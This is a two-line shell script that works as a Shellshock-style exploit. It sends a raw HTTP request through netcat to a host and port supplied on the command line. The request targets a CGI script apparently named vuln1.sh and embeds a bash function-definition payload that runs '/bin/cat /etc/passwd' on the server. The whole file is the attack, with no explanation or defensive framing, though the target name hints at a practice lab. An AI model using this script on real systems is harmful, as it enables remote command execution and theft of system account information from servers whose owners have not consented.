#!/bin/sh
echo -en "GET /cgi-bin/vuln1.sh () { :; }; echo;echo;/bin/cat /etc/passwd\r\nHost: localhost\r\n\r\n" | nc $1 $2
